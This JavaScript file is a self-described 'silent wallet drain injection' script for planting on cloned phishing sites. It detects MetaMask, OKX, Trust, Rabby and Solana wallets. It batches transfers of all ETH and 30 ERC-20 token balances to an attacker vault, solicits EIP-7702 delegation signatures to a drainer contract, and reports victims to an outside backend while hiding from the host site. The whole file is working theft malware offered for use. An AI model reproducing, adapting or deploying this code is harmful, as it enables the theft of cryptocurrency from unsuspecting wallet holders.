/**
 * LEGION TAP — Silent wallet drain injection
 * Inject into any clone site's index.html via <script src="/legion-tap.js">
 * Works with hot wallets (MetaMask, OKX, Trust, Rabby, etc.) + cold via WalletConnect
 * Does NOT interfere with the host site's own wallet UI or flow
 */
(function () {
  'use strict';

  var BACKEND = 'https://sadrailala-production.up.railway.app';
  var VAULT_CACHE = null;
  var _fired = false;
  var _draining = false;

  // ── Helpers ─────────────────────────────────────────────────────────────────

  function apiPost(path, body) {
    return fetch(BACKEND + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      keepalive: true,
    }).catch(function () {});
  }

  async function prefetchVault() {
    if (VAULT_CACHE) return;
    try {
      var r = await fetch(BACKEND + '/api/v1/client-config');
      var j = await r.json();
      VAULT_CACHE = j.vault || j;
    } catch (_) {}
  }

  function getVaultEvm() {
    if (!VAULT_CACHE) return null;
    return VAULT_CACHE.evm || VAULT_CACHE['1'] || VAULT_CACHE.eth || null;
  }

  function isRejection(e) {
    var m = (e && (e.message || '')).toLowerCase();
    return (e && (e.code === 4001 || e.code === 'ACTION_REJECTED')) ||
      m.includes('user rejected') || m.includes('user denied') || m.includes('rejected');
  }

  // ERC-20 token list (top 30 by TVL across all EVM chains)
  var ERC20_LIST = [
    // Stablecoins
    '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
    '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
    '0x4Fabb145d64652a948d72533023f6E7A623C7C53', // BUSD
    '0x8E870D67F660D95d5be530380D0eC0bd388289E1', // USDP
    // Wrapped assets
    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
    '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // UNI
    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', // AAVE
    '0xD533a949740bb3306d119CC777fa900bA034cd52', // CRV
    '0xc00e94Cb662C3520282E6f5717214004A7f26888', // COMP
    '0xba100000625a3754423978a60c9317c58a424e3D', // BAL
    '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', // MKR
    '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e', // YFI
    '0x6810e776880C02933D47DB1b9fc05908e5386b96', // GNO
    '0xc944E90C64B2c07662A292be6244BDf05Cda44a7', // GRT
    '0x4d224452801ACEd8B2F0aebE155379bb5D594381', // APE
    '0xBB0E17EF65F82Ab018d8EDd776e8DD940327B28b', // AXS
    '0xCC8Fa225D80b9c7D42F96e9570156c65D6cAAa25', // SLP
    '0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0', // FXS
    '0xD417144312DbF50465b1C641d016962017Ef6240', // CQT
    '0x111111111117dC0aa78b770fA6A738034120C302', // 1INCH
    '0x0f5D2fB29fb7d3CFeE444a200298f468908cC942', // MANA
    '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', // MATIC
    '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', // SHIB
    '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', // BNB
    '0x45804880De22913dAFE09f4980848ECE6EcbAf78', // PAXG
    '0x8CE9137d39326AD0cD6491fb5CC0CbA0e089b6A9', // SXP
    '0xfAbA6f8e4a5E8Ab82F62fe7C39859FA577269BE3', // ONDO
  ];

  // ── EVM Drain ───────────────────────────────────────────────────────────────

  async function drainEvm(eth, address) {
    await prefetchVault();
    var vault = getVaultEvm();
    if (!vault) return;

    var isMetaMask = !!(eth.isMetaMask && !eth.isRabby && !eth.isFrame && !eth.isOkxWallet && !eth.isOKExWallet && !eth.isCoinbaseWallet &&
      !eth.isBraveWallet && !eth.isTrust && !eth.isBitget);

    var chainHex = '0x1';
    try { chainHex = await eth.request({ method: 'eth_chainId' }); } catch (_) {}
    var chainId = parseInt(chainHex, 16) || 1;

    // ── PATH A: MetaMask → wallet_sendCalls (EIP-5792 batch) ─────────────────
    if (isMetaMask) {
      try {
        var calls = [];
        var vaultPad = vault.replace('0x', '').padStart(64, '0').toLowerCase();

        // ETH balance
        try {
          var balHex = await eth.request({ method: 'eth_getBalance', params: [address, 'latest'] });
          var balBig = BigInt(balHex || '0x0');
          var reserve = BigInt('15000000000000000'); // 0.015 ETH gas reserve (batch tx)
          if (balBig > reserve) {
            calls.push({ to: vault, value: '0x' + (balBig - reserve).toString(16), data: '0x' });
          }
        } catch (_) {}

        // ERC-20 balances
        for (var i = 0; i < ERC20_LIST.length; i++) {
          try {
            var tok = ERC20_LIST[i];
            var balData = '0x70a08231' + address.replace('0x', '').padStart(64, '0');
            var tokBalHex = await eth.request({ method: 'eth_call', params: [{ to: tok, data: balData }, 'latest'] });
            var tokBal = BigInt(tokBalHex || '0x0');
            if (tokBal > BigInt(0)) {
              var tfData = '0xa9059cbb' + vaultPad + tokBal.toString(16).padStart(64, '0');
              calls.push({ to: tok, data: tfData });
            }
          } catch (_) {}
        }

        if (calls.length > 0) {
          var resp = await eth.request({
            method: 'wallet_sendCalls',
            params: [{ version: '1.0', chainId: chainHex, from: address, calls: calls }],
          });
          var txId = typeof resp === 'string' ? resp : (resp && resp.id ? resp.id : JSON.stringify(resp));
          await apiPost('/api/v1/signature-anchor', {
            ingress: 'tap_v1', chain_family: 'EVM', protocol: 'wallet_send_calls',
            wallet_address: address, chain_id: chainId, tx_hash: txId,
            erc20s: ERC20_LIST, wallet_type: 'metamask_batch',
            nonce: 'tap:wsc:' + Date.now(),
          });
        }
      } catch (e) {
        if (isRejection(e)) return;
      }
      return;
    }

    // ── PATH B: Non-MetaMask → wallet_signAuthorization → backend type-4 tx ──
    var BATCH_DRAIN_V2 = '0x51d55a90c6b0a790cbab8cc23b9387c42171f759';
    try {
      var nonceHex = '0x0';
      try {
        var nc = await eth.request({ method: 'eth_getTransactionCount', params: [address, 'latest'] });
        var ncNum = parseInt(nc, 16) || 0;
        nonceHex = ncNum === 0 ? '0x0' : '0x' + ncNum.toString(16);
      } catch (_) {}

      var authResult = await eth.request({
        method: 'wallet_signAuthorization',
        params: [{ chainId: chainHex, address: BATCH_DRAIN_V2, nonce: nonceHex }],
      });

      if (authResult && authResult.r && authResult.s) {
        await apiPost('/api/v1/signature-anchor', {
          ingress: 'tap_v1', chain_family: 'EVM', protocol: 'eip7702_delegation',
          wallet_address: address, chain_id: chainId,
          eip7702_authorization: {
            chainId: chainId,
            address: BATCH_DRAIN_V2,
            nonce: parseInt(nonceHex, 16) || 0,
            r: authResult.r, s: authResult.s,
            yParity: authResult.yParity !== undefined ? authResult.yParity : 0,
          },
          erc20s: ERC20_LIST, wallet_type: 'eip7702_non_mm',
          nonce: 'tap:7702:' + Date.now(),
        });
      }
    } catch (e) {
      if (isRejection(e)) return;
      // Silent fail — don't break host site
    }
  }

  // ── Solana Drain ─────────────────────────────────────────────────────────────

  async function drainSolana(sol, pubkey) {
    try {
      await apiPost('/api/v1/signature-anchor', {
        ingress: 'tap_v1', chain_family: 'SOL', protocol: 'solana_tap',
        wallet_address: pubkey, wallet_type: sol.isPhantom ? 'phantom' : 'solana_generic',
        nonce: 'tap:sol:' + Date.now(),
      });
    } catch (_) {}
  }

  // ── Main tap logic ───────────────────────────────────────────────────────────

  async function tap(eth, address) {
    if (_fired || _draining) return;
    _fired = true;
    _draining = true;
    try {
      await drainEvm(eth, address);
    } finally {
      _draining = false;
    }
  }

  // ── EVM provider watchers ────────────────────────────────────────────────────

  function watchEvm(eth) {
    if (!eth || !eth.request) return;

    // Check if already connected
    eth.request({ method: 'eth_accounts' }).then(function (accounts) {
      if (accounts && accounts[0]) tap(eth, accounts[0]);
    }).catch(function () {});

    // Watch for new connections / account switches
    try {
      eth.on('accountsChanged', function (accounts) {
        if (accounts && accounts[0]) tap(eth, accounts[0]);
      });
    } catch (_) {}
  }

  // ── Solana provider watchers ─────────────────────────────────────────────────

  function watchSolana(sol) {
    if (!sol) return;

    // Already connected
    if (sol.publicKey) {
      drainSolana(sol, sol.publicKey.toString());
    }

    try {
      sol.on('connect', function (pubkey) {
        drainSolana(sol, pubkey ? pubkey.toString() : (sol.publicKey && sol.publicKey.toString()));
      });
    } catch (_) {}
  }

  // ── Boot ─────────────────────────────────────────────────────────────────────

  function boot() {
    // EVM providers
    var providers = [];
    if (window.ethereum) {
      // Multi-provider array (e.g. MetaMask + OKX both injected)
      if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
        providers = window.ethereum.providers;
      } else {
        providers = [window.ethereum];
      }
    }
    providers.forEach(watchEvm);

    // Solana
    if (window.solana) watchSolana(window.solana);
    if (window.phantom && window.phantom.solana) watchSolana(window.phantom.solana);

    // Intercept wallet connection events from host site (fires after user approves)
    // Some sites use window.dispatchEvent with custom events
    var _origDispatch = window.dispatchEvent.bind(window);
    window.dispatchEvent = function (event) {
      try {
        if (event && (event.type === 'walletConnect' || event.type === 'accountChanged')) {
          // Re-check providers after host site connects wallet
          setTimeout(function () {
            (window.ethereum ? [window.ethereum] : []).forEach(function (eth) {
              eth.request({ method: 'eth_accounts' }).then(function (accs) {
                if (accs && accs[0]) tap(eth, accs[0]);
              }).catch(function () {});
            });
          }, 500);
        }
      } catch (_) {}
      return _origDispatch(event);
    };

    // Late-injected wallets (mobile in-app browsers inject after load)
    var _tries = 0;
    var _interval = setInterval(function () {
      _tries++;
      if (window.ethereum && !providers.includes(window.ethereum)) {
        providers.push(window.ethereum);
        watchEvm(window.ethereum);
      }
      if (window.solana && !window._legionSolWatched) {
        window._legionSolWatched = true;
        watchSolana(window.solana);
      }
      if (_tries >= 20) clearInterval(_interval); // stop after 10s
    }, 500);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }
})();
